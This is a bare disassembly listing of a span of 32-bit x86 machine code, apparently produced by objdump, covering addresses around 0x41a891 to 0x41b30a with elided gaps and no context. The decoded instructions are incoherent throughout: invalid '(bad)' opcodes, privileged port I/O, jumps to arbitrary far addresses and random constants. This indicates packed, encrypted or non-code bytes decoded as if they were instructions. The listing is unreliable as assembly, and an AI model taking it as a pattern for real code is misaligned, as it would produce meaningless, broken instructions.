  41a891:	mov    ah,0xee
  41a893:	stos   BYTE PTR es:[edi],al
  41a894:	xchg   ecx,eax
  41a895:	test   eax,0xddaae344
  41a89a:	mov    edx,0x56ff3575
  41a89f:	cmp    al,0x96
  41a8a1:	pusha  
  41a8a2:	xchg   WORD PTR ss:[eax],si
  41a8a6:	jne    0x41a8c4
  41a8a8:	add    DWORD PTR [edi-0x22977804],edi
  41a8ae:	push   eax
  41a8af:	daa    
  41a8b0:	test   eax,0xd2833dad
  41a8b5:	je     0x41a8e8
  41a8b7:	add    eax,0x98050689
  41a8bc:	inc    eax
  41a8bd:	dec    ecx
  41a8be:	xor    BYTE PTR [edi+eax*8+0x31],0x2b
  41a8c3:	fcmovnb st,st(2)
  41a8c5:	in     eax,dx
  41a8c6:	lahf   
  41a8c7:	test   al,0x62
  41a8c9:	and    DWORD PTR [esp+edi*1-0x3595fd8b],edi
  41a8d0:	int3   
  41a8d1:	xor    eax,0x49365585
  41a8d6:	imul   edx,eax,0x701e5004
  41a8dc:	dec    edx
  41a8dd:	dec    esp
  41a8de:	pop    ebx
  41a8df:	aas    
  41a8e0:	pop    esp
  41a8e1:	jmp    0xd317fd15
  41a8e6:	shl    DWORD PTR [ecx+0x22],1
  41a8e9:	dec    ecx
  41a8ea:	push   ebp
  41a8eb:	into   
  41a8ec:	lock xor eax,0xf7e375ec
  41a8f2:	cmp    al,0xb
  41a8f4:	mov    ecx,0x8ea5ded6
  41a8f9:	push   edx
  41a8fa:	mov    al,ds:0x2975eea2
  41a8ff:	(bad)  
  41a900:	jle    0x41a911
  41a902:	lea    esp,[edi]
  41a904:	add    eax,0xd2cd90f5
  41a909:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a90a:	mov    dl,0xfd
  41a90c:	mov    cl,0x14
  41a90e:	mov    esp,0x1caaa8ec
  41a913:	ret    0xaf90
  41a916:	data16 int3 
  41a918:	in     al,dx
  41a919:	ror    ebp,0xf0
  41a91c:	cmp    al,0x32
  41a91e:	nop
  41a91f:	aam    0x13
  41a921:	dec    esi
  41a922:	cmp    ebx,DWORD PTR [ebx-0x75]
  41a925:	or     ebp,ebp
  41a927:	js     0x41a8b4
  41a929:	mov    edi,0xea5e58df
  41a92e:	adc    DWORD PTR [edx+0x29],ecx
  41a931:	out    0x1d,eax
  41a933:	xchg   esi,eax
  41a934:	(bad)
  41a937:	add    ebx,DWORD PTR [eax+0x64b4b979]
  41a93d:	jecxz  0x41a8f4
  41a93f:	sar    BYTE PTR ds:0xb5,1
	...
  41a9b1:	add    BYTE PTR [eax],al
  41a9b3:	add    BYTE PTR [ebx],dh
  41a9b5:	xor    DWORD PTR [ebx+0x77e793c5],edx
  41a9bb:	idiv   DWORD PTR [ecx-0x7461c20f]
  41a9c1:	mov    edi,0x202a57dc
  41a9c6:	add    DWORD PTR [eax],eax
  41a9c8:	test   BYTE PTR [eax],0x0
  41a9cb:	add    BYTE PTR [edi],ch
  41a9cd:	lods   al,BYTE PTR ds:[esi]
  41a9ce:	mov    esp,0x59ef8714
  41a9d3:	or     eax,DWORD PTR [edx+ecx*8]
  41a9d6:	jne    0x41a975
  41a9d8:	push   cs
  41a9d9:	adc    edi,ecx
  41a9db:	push   es
  41a9dc:	inc    edx
  41a9dd:	mov    ebx,0xc4c34c4b
  41a9e2:	test   al,0xfe
  41a9e4:	mov    WORD PTR [esp+esi*4-0x6a1d9ea2],fs
  41a9eb:	fmul   DWORD PTR [eax]
  41a9ed:	mov    WORD PTR [edx-0x40],gs
  41a9f0:	inc    ecx
  41a9f1:	cs cli 
  41a9f3:	inc    ebx
  41a9f4:	pop    ss
  41a9f5:	push   edx
  41a9f6:	lock je 0x41a9b9
  41a9f9:	add    BYTE PTR [ebp+ecx*8-0x750b7cbb],al
  41aa00:	int    0x20
  41aa02:	mov    esp,DWORD PTR [ecx+eax*2+0x7a]
  41aa06:	mov    ebx,0x641dbfd
  41aa0b:	jle    0x41a9c2
  41aa0d:	jns    0x41aa77
  41aa0f:	outs   dx,BYTE PTR ds:[esi]
  41aa10:	shl    ecx,cl
  41aa12:	and    ecx,DWORD PTR [esi-0x75]
  41aa15:	arpl   WORD PTR [edx+ebx*1+0x3a],di
  41aa19:	and    al,0xa
  41aa1b:	out    0x4f,eax
  41aa1d:	test   eax,0x124e1360
  41aa22:	jno    0x41aa97
  41aa24:	js     0x41a9d2
  41aa26:	fwait
  41aa27:	into   
  41aa28:	push   edi
  41aa29:	adc    ah,BYTE PTR [ebx-0x39]
  41aa2c:	add    BYTE PTR [ecx+eiz*2],cl
  41aa2f:	or     esi,DWORD PTR [ecx+ecx*1]
  41aa32:	scas   eax,DWORD PTR es:[edi]
  41aa33:	or     BYTE PTR [ecx],0xff
  41aa36:	or     eax,0x65f746ab
  41aa3b:	das    
  41aa3c:	shr    DWORD PTR [edx-0x8],0xcd
  41aa40:	cld    
  41aa41:	mov    bh,0xdb
  41aa43:	aad    0xcc
  41aa45:	xchg   esp,eax
  41aa46:	mov    bh,0x6c
  41aa48:	mov    bl,0x58
  41aa4a:	(bad)  
  41aa4b:	rcr    esp,cl
  41aa4d:	rcr    BYTE PTR [eax-0x4c],1
  41aa50:	enter  0xa212,0x17
  41aa54:	xor    eax,0xd211ce76
  41aa59:	push   esi
  41aa5a:	sub    ah,BYTE PTR [ecx-0x25]
  41aa5d:	das    
  41aa5e:	outs   dx,DWORD PTR ds:[esi]
  41aa5f:	lds    esp,FWORD PTR [ebp+0x3ea946]
  41aa65:	inc    esi
  41aa66:	test   DWORD PTR [edi+eax*4-0x7360db6e],ebp
  41aa6d:	dec    esi
  41aa6f:	xchg   ecx,eax
  41aa70:	jecxz  0x41aa4c
  41aa72:	mov    al,BYTE PTR [edx+0x7e]
  41aa75:	jmp    DWORD PTR [ecx+0x1c87ae24]
  41aa7b:	pusha  
  41aa7c:	or     eax,0x71ae4c32
  41aa81:	add    ah,dl
  41aa83:	imul   ebx,DWORD PTR [edi+0x4c],0xe9a9c991
  41aa8a:	cs js  0x41aa4e
  41aa8d:	mov    bl,0x72
  41aa8f:	push   0xfffffff2
  41aa91:	iret   
  41aa92:	lds    edx,FWORD PTR [edx+0x2c]
  41aa95:	sbb    DWORD PTR [ebp+0x55],ecx
  41aa98:	push   ax
  41aa9a:	push   ebx
  41aa9b:	sbb    bh,cl
  41aa9d:	lea    eax,[edi]
  41aa9f:	mov    BYTE PTR [ebp+0x17],bh
  41aaa2:	lods   al,BYTE PTR ds:[esi]
  41aaa3:	test   BYTE PTR [ebp+0x2b67880a],dl
  41aaa9:	into   
  41aaaa:	js     0x41ab0e
  41aaac:	(bad)  
  41aaad:	fsubrp st(2),st
  41aaaf:	ret    
  41aab0:	sub    al,BYTE PTR [edx+0x1abe8a9a]
  41aab6:	cmp    edx,eax
  41aab8:	xor    edx,esi
  41aaba:	outs   dx,DWORD PTR ds:[esi]
  41aabb:	mov    dh,0x8c
  41aabd:	pop    esp
  41aabe:	pop    ds
  41aabf:	xlat   BYTE PTR ds:[ebx]
  41aac0:	ret    0x3d
	...
  41ab33:	add    BYTE PTR [edx-0x3c],cl
  41ab36:	cli    
  41ab37:	inc    edi
  41ab38:	(bad)  
  41ab39:	jg     0x41ab3a
  41ab3b:	int    0x91
  41ab3d:	pop    es
  41ab3e:	sbb    ecx,DWORD PTR [edi-0x72]
  41ab41:	mov    eax,0x212039d2
  41ab46:	add    DWORD PTR [eax],eax
  41ab48:	test   BYTE PTR [eax],0x0
  41ab4b:	add    BYTE PTR [ecx-0x5373d8b8],ch
  41ab51:	xchg   ebx,eax
  41ab52:	jge    0x7a48e101
  41ab58:	lea    ebp,[bp-0x14bb]
  41ab5d:	cmp    eax,0xf4da84dc
  41ab62:	pop    edi
  41ab63:	lock push esi
  41ab65:	fsubr  DWORD PTR [eax-0x48]
  41ab68:	jmp    0x34fa:0xf25c91cd
  41ab6f:	bound  esi,QWORD PTR [ecx+0x61]
  41ab72:	(bad)  
  41ab73:	sti    
  41ab74:	push   esp
  41ab75:	sub    dh,ah
  41ab77:	(bad)  
  41ab78:	rol    DWORD PTR [edx+0x64],1
  41ab7b:	push   esp
  41ab7c:	(bad)  [esi-0x45]
  41ab7f:	pop    ss
  41ab80:	retf   0x75c
  41ab83:	mov    dh,0x27
  41ab85:	push   cs
  41ab86:	shr    BYTE PTR ss:[edx-0x3b],1
  41ab8a:	mov    edx,DWORD PTR [ebx+0x23]
  41ab8d:	sub    esi,DWORD PTR [esi-0x72c13d75]
  41ab93:	dec    esp
  41ab94:	xchg   DWORD PTR [ebp+0x3119ea6],ebx
  41ab9a:	pop    ebp
  41ab9b:	push   esi
  41ab9c:	push   ds
  41ab9d:	std    
  41ab9e:	das    
  41ab9f:	inc    ebp
  41aba0:	iret   
  41aba1:	sahf   
  41aba2:	out    dx,eax
  41aba3:	mov    esp,0x87ada5b5
  41aba8:	mov    ch,0x11
  41abaa:	fcom   DWORD PTR [esi]
  41abac:	leave  
  41abad:	cli    
  41abae:	ret    0x3f3
  41abb1:	push   edx
  41abb2:	jle    0x41abff
  41abb4:	retf   
  41abb5:	pop    edx
  41abb6:	xchg   esi,eax
  41abb7:	nop
  41abb8:	sub    BYTE PTR [edx+0x24],dl
  41abbb:	mov    ebp,0x2e1c9ac4
  41abc0:	or     edi,ebp
  41abc2:	test   al,0xdb
  41abc4:	mov    DWORD PTR [ebp-0xc],edx
  41abc7:	ja     0x41ab4f
  41abc9:	leave  
  41abca:	fmul   DWORD PTR [ecx-0x43]
  41abcd:	scas   al,BYTE PTR es:[edi]
  41abce:	or     DWORD PTR [edi-0xb6fda33],ebp
  41abd4:	bound  esi,QWORD PTR [esp-0x17]
  41abd8:	add    bl,BYTE PTR ds:0x246e0c2d
  41abde:	mov    ebx,0x1235188f
  41abe3:	sub    BYTE PTR [edi],cl
  41abe5:	xor    dh,BYTE PTR [ecx-0x1139f50]
  41abeb:	shr    DWORD PTR [eax],0x7f
  41abee:	repz es clc 
  41abf1:	shl    BYTE PTR [edx+0x5f69848b],cl
  41abf7:	aas    
  41abf8:	aaa    
  41abf9:	xor    ecx,DWORD PTR [ecx-0x52]
  41abfc:	xor    BYTE PTR [esi+edx*2+0xca37a3f],bl
  41ac03:	inc    ebx
  41ac04:	scas   al,BYTE PTR es:[edi]
  41ac05:	test   DWORD PTR [ebp+0x7c172536],ecx
  41ac0b:	cmp    edx,ebx
  41ac0d:	aas    
  41ac0e:	adc    ecx,DWORD PTR [edx-0x63d7d494]
  41ac14:	jmp    0x262ba805
  41ac19:	data16 out 0xc0,al
  41ac1c:	pushf  
  41ac1d:	pusha  
  41ac1e:	cmp    al,0x4d
  41ac20:	out    0xf8,al
  41ac22:	ins    DWORD PTR es:[edi],dx
  41ac23:	push   0xffffffe4
  41ac25:	add    esi,DWORD PTR gs:[ebp+0x4ef2cc2d]
  41ac2c:	adc    edx,0xc
  41ac2f:	bound  ebx,QWORD PTR [esi-0x20aa6bb9]
  41ac35:	dec    esp
  41ac36:	and    esp,edx
  41ac38:	ds mov edi,0x84c3d379
  41ac3e:	jmp    0x41ac1b
  41ac40:	gs xchg edx,eax
	...
  41acb2:	add    BYTE PTR [eax],al
  41acb4:	lock xchg edi,eax
  41acb6:	std    
  41acb7:	cmp    al,0xff
  41acb9:	jle    0x41acac
  41acbb:	fisttp WORD PTR [esi+0x20]
  41acbe:	cmp    eax,0x543afb02
  41acc3:	int3   
  41acc4:	push   ss
  41acc5:	and    al,BYTE PTR [ecx]
  41acc7:	add    dh,dh
  41acc9:	add    BYTE PTR [eax],al
  41accb:	add    bl,ah
  41accd:	aad    0x51
  41accf:	into   
  41acd0:	sbb    ah,dl
  41acd2:	jp     0x41acb9
  41acd4:	ins    DWORD PTR es:[edi],dx
  41acd5:	in     al,dx
  41acd6:	je     0x41aca0
  41acd8:	adc    eax,0x37eece66
  41acdd:	loop   0x41ad12
  41acdf:	inc    edx
  41ace0:	mov    ?,WORD PTR [eax+0xf]
  41ace3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ace4:	gs je  0x41aced
  41ace7:	sbb    ecx,DWORD PTR [esp+ebp*8]
  41acea:	dec    eax
  41aceb:	je     0x41acec
  41aced:	xchg   esi,eax
  41acee:	dec    ebx
  41acef:	out    dx,al
  41acf0:	fucom  st(4)
  41acf2:	data16 repz or al,0xf0
  41acf6:	jae    0x41ad77
  41acf8:	mov    ch,0xb8
  41acfa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41acfb:	in     al,dx
  41acfc:	lods   eax,DWORD PTR ds:[esi]
  41acfd:	mov    ch,0x3
  41acff:	clc    
  41ad00:	add    eax,0xa88d5b34
  41ad05:	rcr    BYTE PTR [eax],cl
  41ad07:	dec    edx
  41ad08:	pop    edi
  41ad09:	inc    dx
  41ad0b:	aas    
  41ad0c:	cmp    ch,dl
  41ad0e:	lea    esi,[ecx+0x13]
  41ad11:	(bad)  
  41ad12:	jb     0x41acc3
  41ad14:	jmp    0x200f1782
  41ad19:	(bad)  
  41ad1a:	push   edx
  41ad1b:	pop    ds
  41ad1c:	and    cl,BYTE PTR [eax]
  41ad1e:	cmp    esp,DWORD PTR [edx-0x52e6f806]
  41ad24:	add    BYTE PTR ds:0x36c2df1a,dl
  41ad2a:	cli    
  41ad2b:	test   al,0xa6
  41ad2d:	sub    BYTE PTR [eax-0x3b09d2d4],0x75
  41ad34:	add    dh,bl
  41ad36:	fstp   QWORD PTR [edx]
  41ad38:	sub    cl,BYTE PTR [ebx-0x40]
  41ad3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ad3c:	cdq    
  41ad3d:	and    esi,DWORD PTR [edx+esi*1]
  41ad40:	mov    eax,ds:0x2ffc21bf
  41ad45:	mov    ecx,0x65538f0e
  41ad4a:	shl    DWORD PTR [edx],1
  41ad4c:	pusha  
  41ad4d:	mov    dh,0xf2
  41ad4f:	or     al,0x68
  41ad51:	fbld   TBYTE PTR [ebp+eiz*2-0x1f]
  41ad55:	or     ch,BYTE PTR [ebx+0x70b77dcf]
  41ad5b:	jecxz  0x41ada0
  41ad5d:	and    eax,DWORD PTR [esi]
  41ad5f:	add    DWORD PTR [ebp+0x427869fc],eax
  41ad65:	repnz add al,0xf8
  41ad68:	mov    eax,ds:0x1b0ea2db
  41ad6d:	in     eax,dx
  41ad6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ad6f:	cld    
  41ad70:	in     eax,0x9c
  41ad72:	mov    dl,0x2a
  41ad74:	jecxz  0x41ad9b
  41ad76:	cmp    al,0x43
  41ad78:	fist   WORD PTR [edx-0x49003223]
  41ad7e:	xchg   edx,eax
  41ad7f:	das    
  41ad80:	leave  
  41ad81:	pop    esp
  41ad82:	sahf   
  41ad83:	mov    WORD PTR [esi+0x22],gs
  41ad86:	add    al,0x1d
  41ad88:	scas   al,BYTE PTR es:[edi]
  41ad89:	xor    eax,DWORD PTR [esi-0x14]
  41ad8c:	mov    dh,0x38
  41ad8e:	adc    eax,0x98b89450
  41ad93:	out    dx,eax
  41ad94:	mov    DWORD PTR [edx],0xfb0f4940
  41ad9a:	imul   edi,edx,0xf92a727b
  41ada0:	cmp    eax,0x8120a321
  41ada5:	imul   eax,DWORD PTR [ecx-0x35c6ea88],0xb331ac55
  41adaf:	(bad)  
  41adb0:	imul   esp
  41adb2:	test   DWORD PTR [ebp+0x6f],esp
  41adb5:	ds daa 
  41adb7:	pushf  
  41adb8:	jmp    0x41ad82
  41adba:	push   cs
  41adbb:	sbb    eax,0x5daf46b1
  41adc0:	mov    bl,0x77
	...
  41ae32:	add    BYTE PTR [eax],al
  41ae34:	xchg   eax,ebx
  41ae36:	pop    ss
  41ae37:	lds    ebx,FWORD PTR [edi-0x31]
  41ae3a:	xlat   BYTE PTR ds:[ebx]
  41ae3b:	ficom  DWORD PTR [edi-0x64888be3]
  41ae41:	loopne 0x41add4
  41ae43:	bound  ecx,QWORD PTR [ebx+eiz*1]
  41ae46:	add    DWORD PTR [eax],eax
  41ae48:	test   BYTE PTR [eax],0x0
  41ae4b:	add    BYTE PTR [ebx],ch
  41ae4d:	adc    al,0xe2
  41ae4f:	sbb    DWORD PTR [ebx+0x51b02a34],ebp
  41ae55:	xchg   ecx,eax
  41ae56:	pop    ds
  41ae57:	pop    ss
  41ae58:	pushf  
  41ae59:	pop    esi
  41ae5a:	sbb    al,0xac
  41ae5c:	or     BYTE PTR [edx-0x11c4e0be],0x36
  41ae63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ae64:	and    BYTE PTR [edi*4-0x12a00811],dl
  41ae6b:	adc    dl,ah
  41ae6d:	cmp    BYTE PTR [ebx+eax*8-0x85a737d],cl
  41ae74:	(bad)  
  41ae75:	data16 aas 
  41ae77:	hlt    
  41ae78:	and    al,0xcf
  41ae7a:	outs   dx,BYTE PTR ds:[esi]
  41ae7b:	inc    ebx
  41ae7c:	adc    eax,0x575ca24
  41ae81:	enter  0xa85e,0x15
  41ae85:	xor    BYTE PTR [edi-0x22],0xd5
  41ae89:	push   eax
  41ae8a:	add    DWORD PTR [edx-0x5e],edx
  41ae8d:	pusha  
  41ae8e:	push   0xffffffbd
  41ae90:	lea    esi,[edx-0x4c]
  41ae93:	shl    dh,cl
  41ae95:	lock shl DWORD PTR [ebx+0x760254f5],cl
  41ae9c:	push   esi
  41ae9d:	pushf  
  41ae9e:	jno    0x41aeab
  41aea0:	pusha  
  41aea1:	ror    BYTE PTR [ecx+ecx*4-0x252cd4e3],0xa
  41aea9:	inc    edx
  41aeaa:	fs je  0x41ae41
  41aead:	and    eax,0x2cd37567
  41aeb2:	sbb    al,0x9a
  41aeb4:	mov    ds:0x86f2a22,eax
  41aeb9:	push   ecx
  41aeba:	outs   dx,BYTE PTR ds:[esi]
  41aebb:	jb     0x41aeda
  41aebd:	jle    0x41aeb6
  41aebf:	xor    DWORD PTR [edi+edi*4-0x13dd4047],eax
  41aec6:	xlat   BYTE PTR ds:[ebx]
  41aec7:	cwde   
  41aec8:	icebp  
  41aec9:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  41aecb:	out    0xd2,al
  41aecd:	sbb    al,0x8f
  41aecf:	in     al,0xd2
  41aed1:	stos   BYTE PTR es:[edi],al
  41aed2:	mov    al,BYTE PTR [ecx]
  41aed4:	xchg   ecx,eax
  41aed5:	data16 fsub QWORD PTR [edi]
  41aed9:	mov    eax,ds:0x37027651
  41aede:	sub    DWORD PTR [eax+0x1e],ecx
  41aee1:	arpl   WORD PTR [eax-0x6b],bp
  41aee4:	cmp    BYTE PTR [edx-0x54b12561],ah
  41aeea:	cmc    
  41aeeb:	leave  
  41aeec:	shl    DWORD PTR [edi-0x79],cl
  41aeef:	or     BYTE PTR [edi],bh
  41aef1:	pushf  
  41aef2:	xor    BYTE PTR ds:0x44545152,0x0
  41aef9:	and    edi,DWORD PTR [ebx-0x328b9884]
  41aeff:	and    eax,0xfc608663
  41af04:	add    BYTE PTR [ecx],al
  41af06:	adc    eax,0xa1b9580d
  41af0b:	push   ds
  41af0c:	push   0x62
  41af0e:	adc    al,ch
  41af10:	pop    eax
  41af11:	or     eax,0x6f5c2e6f
  41af16:	mov    eax,?
  41af18:	xchg   ecx,eax
  41af19:	mov    dl,BYTE PTR [ebx+esi*8]
  41af1c:	sub    al,0x48
  41af1e:	das    
  41af1f:	jns    0x41af77
  41af21:	shl    ah,1
  41af23:	jg     0x41af30
  41af25:	inc    esp
  41af26:	cmp    al,0xb
  41af28:	scas   al,BYTE PTR es:[edi]
  41af29:	push   ebp
  41af2a:	push   es
  41af2b:	inc    edx
  41af2c:	sbb    eax,0x1c48cceb
  41af31:	(bad)  
  41af33:	xchg   ebp,eax
  41af34:	mov    ds:0xb2e8e14a,eax
  41af39:	not    DWORD PTR [ebp+0xa]
  41af3c:	mov    eax,0x16855beb
  41af41:	jo     0x41af43
	...
  41afb3:	add    BYTE PTR [esi-0x15],cl
  41afb6:	sub    cl,BYTE PTR [esi-0x51]
  41afb9:	iret   
  41afba:	outs   dx,BYTE PTR ds:[esi]
  41afbb:	jmp    0x41af3d
  41afbd:	rcl    DWORD PTR [esi+0x1d],0x77
  41afc1:	pushf  
  41afc2:	arpl   WORD PTR ds:[edx],ax
  41afc5:	and    al,0x1
  41afc7:	add    dh,dh
  41afc9:	add    BYTE PTR [eax],al
  41afcb:	add    bh,ah
  41afcd:	movups xmm7,xmm6
  41afd0:	mul    ch
  41afd2:	or     dl,ah
  41afd4:	inc    ebx
  41afd5:	cmp    eax,0x20b1c10a
  41afda:	scas   al,BYTE PTR es:[edi]
  41afdb:	cmp    DWORD PTR [edx+0x564db609],ecx
  41afe1:	mov    cl,0xaf
  41afe3:	loope  0x41b02c
  41afe5:	dec    esp
  41afe6:	lds    eax,FWORD PTR [ebx-0x63881a31]
  41afec:	sub    bh,bl
  41afee:	nop
  41afef:	pop    ebp
  41aff0:	adc    DWORD PTR [edi+0x18],0x7
  41aff4:	ds out 0x3d,eax
  41aff7:	(bad)  
  41aff8:	int3   
  41aff9:	push   eax
  41affa:	test   DWORD PTR [ecx+0x220150b6],0xea28edd8
  41b004:	and    eax,0x40e4d51a
  41b009:	pop    edx
  41b00a:	xor    esp,DWORD PTR [esp+esi*1]
  41b00d:	lods   al,BYTE PTR ds:[esi]
  41b00e:	sub    BYTE PTR [ecx+ebp*8-0x399f8ced],0x9a
  41b016:	mov    ds:0x71bc2b0d,al
  41b01b:	jp     0x41afc0
  41b01d:	leave  
  41b01e:	pop    eax
  41b01f:	test   BYTE PTR [edi-0xa],bh
  41b022:	rol    eax,0xd6
  41b025:	rcr    cl,0x99
  41b028:	mov    ecx,0x5a4775c5
  41b02d:	dec    esp
  41b02e:	jl     0x41afe2
  41b030:	or     BYTE PTR [eax-0xb],bh
  41b033:	pop    ds
  41b034:	push   eax
  41b035:	push   ecx
  41b036:	aaa    
  41b037:	push   ds
  41b038:	out    dx,eax
  41b039:	add    ebp,esi
  41b03b:	sub    BYTE PTR [ebp+0x29],0x1a
  41b03f:	and    ch,bl
  41b041:	or     al,0x42
  41b043:	jno    0x41b04c
  41b045:	das    
  41b046:	mov    esi,DWORD PTR [esi]
  41b048:	xor    bl,BYTE PTR [ebp-0x6c4786fa]
  41b04e:	icebp  
  41b04f:	and    DWORD PTR [eax-0x44],edi
  41b052:	cmp    ebx,DWORD PTR [ebx+esi*8-0x5e]
  41b056:	add    eax,0x67675624
  41b05b:	fdivr  DWORD PTR [ebx+0x321131b2]
  41b061:	popa   
  41b062:	adc    al,0x1a
  41b064:	adc    al,0xc1
  41b066:	mov    WORD PTR [edx],ss
  41b068:	dec    ebp
  41b069:	inc    ebp
  41b06a:	lds    eax,FWORD PTR [esi+0x2808a62d]
  41b070:	dec    edi
  41b071:	sbb    al,0xcb
  41b073:	lods   eax,DWORD PTR ds:[esi]
  41b074:	(bad)  
  41b075:	(bad)  
  41b076:	xchg   esp,eax
  41b077:	jmp    0x41b0bb
  41b079:	div    DWORD PTR [edi-0x52]
  41b07c:	inc    edx
  41b07d:	sahf   
  41b07e:	cmc    
  41b07f:	mov    cl,0x71
  41b081:	mov    gs,eax
  41b083:	jmp    0xc27e:0xa546c86b
  41b08a:	and    al,0xb6
  41b08c:	fsub   DWORD PTR [edx+0x339b85d4]
  41b092:	push   edx
  41b093:	inc    eax
  41b094:	lods   eax,DWORD PTR ds:[esi]
  41b095:	scas   eax,DWORD PTR es:[edi]
  41b096:	push   ds
  41b097:	xor    esi,DWORD PTR [ecx+0x1d]
  41b09a:	lods   eax,DWORD PTR ds:[esi]
  41b09b:	xchg   ecx,eax
  41b09c:	aaa    
  41b09d:	enter  0xed56,0xa4
  41b0a1:	stc    
  41b0a2:	cs int3 
  41b0a4:	and    BYTE PTR [esi-0x2f],ah
  41b0a7:	push   dx
  41b0a9:	aas    
  41b0aa:	push   edx
  41b0ab:	cmp    BYTE PTR ds:0xde5c036c,ch
  41b0b1:	imul   edi,DWORD PTR [eax+0x70661c2e],0xffffff8d
  41b0b8:	push   0xffffffbe
  41b0ba:	ins    DWORD PTR es:[edi],dx
  41b0bb:	rcr    BYTE PTR [edi-0x1f487a7b],cl
  41b0c1:	pop    ecx
	...
  41b132:	add    BYTE PTR [eax],al
  41b134:	sbb    al,0xc
  41b136:	std    
  41b137:	sbb    ebp,edi
  41b139:	stc    
  41b13a:	cld    
  41b13b:	or     eax,0x64289710
  41b140:	cmc    
  41b141:	pop    ebx
  41b142:	dec    ebp
  41b143:	test   eax,0x124f8
  41b148:	test   BYTE PTR [eax],0x0
  41b14b:	add    BYTE PTR [eax],bl
  41b14d:	jp     0x41b125
  41b14f:	scas   al,BYTE PTR es:[edi]
  41b150:	imul   eax,DWORD PTR [edx-0x47],0x46
  41b154:	mov    esp,DWORD PTR [ecx+edi*1+0x41]
  41b158:	add    eax,0xf3b0f216
  41b15d:	aas    
  41b15e:	xor    DWORD PTR [ebp-0x15b10c24],ecx
  41b164:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b165:	push   es
  41b166:	inc    ebp
  41b167:	ds pusha 
  41b169:	mov    cl,BYTE PTR [esi+0x310a5fc8]
  41b16f:	add    DWORD PTR [esi-0x6d],ebx
  41b172:	addr16 ret 
  41b174:	iret   
  41b175:	lods   al,BYTE PTR es:[esi]
  41b177:	mov    dh,0x2d
  41b179:	shr    BYTE PTR [ebp*8-0xe6ab167],cl
  41b180:	xor    esp,DWORD PTR [ebp+0x39bcdc4]
  41b186:	push   ds
  41b187:	mov    ch,0xcf
  41b189:	mul    DWORD PTR [ebp-0x60b41c74]
  41b18f:	cmp    ah,BYTE PTR ds:0x494a9bf9
  41b195:	out    0x8d,al
  41b197:	dec    ebx
  41b198:	dec    ebp
  41b199:	mov    dh,0x50
  41b19b:	(bad)  [edi+0x4f29454a]
  41b1a1:	mov    ah,0x78
  41b1a3:	test   ch,al
  41b1a5:	or     edi,edx
  41b1a7:	or     cl,BYTE PTR [edx-0x4c]
  41b1aa:	xchg   esi,eax
  41b1ab:	mov    eax,ds:0x7b82d33f
  41b1b0:	int3   
  41b1b1:	cmp    cl,BYTE PTR [ecx-0x7811eaaf]
  41b1b7:	sub    edx,DWORD PTR [edi+0x72e1092]
  41b1bd:	int    0x16
  41b1bf:	in     eax,dx
  41b1c0:	imul   esi,DWORD PTR [edi],0x1
  41b1c3:	sub    ebx,DWORD PTR [edi+edi*4-0x7b58d421]
  41b1ca:	pop    ss
  41b1cb:	test   DWORD PTR [ecx-0x2b],eax
  41b1ce:	mov    dh,BYTE PTR [ecx-0xf]
  41b1d1:	out    dx,eax
  41b1d2:	push   ds
  41b1d3:	test   bl,al
  41b1d5:	and    eax,DWORD PTR ds:0xe1c7483
  41b1db:	mov    ah,0xbc
  41b1dd:	cmp    DWORD PTR [ebx+0x5d],esi
  41b1e0:	(bad)  
  41b1e1:	enter  0xac02,0xf0
  41b1e5:	dec    esp
  41b1e6:	push   edi
  41b1e7:	js     0x41b20d
  41b1e9:	jae    0x41b227
  41b1eb:	push   ds
  41b1ec:	fnstenv [ecx]
  41b1ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b1ef:	xchg   edx,eax
  41b1f0:	or     al,0x2b
  41b1f2:	mov    bl,0x21
  41b1f4:	aad    0xc3
  41b1f6:	fwait
  41b1f7:	sbb    eax,0x977368b8
  41b1fc:	push   DWORD PTR [ebp+0x7c73618b]
  41b202:	pop    ebp
  41b203:	cdq    
  41b204:	or     BYTE PTR [edi],0x56
  41b207:	adc    al,0xe3
  41b209:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b20a:	jle    0x41b1d8
  41b20c:	cld    
  41b20d:	jmp    0xa626:0x8325ed28
  41b214:	cli    
  41b215:	xor    DWORD PTR [eax],0x53
  41b218:	sub    BYTE PTR [eax-0x4a985ed7],bh
  41b21e:	adc    BYTE PTR ss:[edx],0xb5
  41b222:	sbb    eax,0xb0f8ef3b
  41b227:	(bad)  
  41b22a:	(bad)  
  41b22b:	push   ds
  41b22c:	ret    0xef5b
  41b22f:	pusha  
  41b230:	inc    BYTE PTR [ecx-0x133ae0c1]
  41b236:	add    edi,DWORD PTR [edx-0x5f]
  41b239:	retf   0x51aa
  41b23c:	xchg   ecx,eax
  41b23d:	inc    ebp
  41b23e:	jg     0x41b285
  41b240:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b241:	repz add BYTE PTR [eax],al
	...
  41b2b4:	neg    DWORD PTR [eax-0x58]
  41b2b7:	adc    ebp,DWORD PTR [edi+0x3afcfff3]
  41b2bd:	out    dx,eax
  41b2be:	jl     0x41b2c7
  41b2c0:	and    cl,BYTE PTR [edx]
  41b2c2:	mov    ch,0x55
  41b2c4:	out    dx,al
  41b2c5:	and    eax,0xf60001
  41b2ca:	add    BYTE PTR [eax],al
  41b2cc:	jge    0x41b28a
  41b2ce:	add    BYTE PTR [edx],0xf5
  41b2d1:	(bad)  
  41b2d2:	jns    0x41b280
  41b2d4:	sub    eax,0x70628347
  41b2d9:	dec    ebp
  41b2da:	arpl   WORD PTR [ebx-0x11d6afc1],di
  41b2e0:	fwait
  41b2e1:	inc    ebp
  41b2e2:	mov    esp,DWORD PTR [eax+0x4d5f842a]
  41b2e8:	mov    ds:0xf80ee11,al
  41b2ed:	add    al,ch
  41b2ef:	cld    
  41b2f0:	jae    0x41b2a0
  41b2f2:	mov    dl,0x83
  41b2f4:	mov    ds:0x7407f85a,al
  41b2f9:	sbb    edx,esp
  41b2fb:	sbb    eax,0x7bd78957
  41b300:	call   0xed690aa4
  41b305:	push   ebp
  41b306:	daa    
  41b307:	or     ch,BYTE PTR [edi]
  41b309:	pop    esp
  41b30a:	aad    0xc4
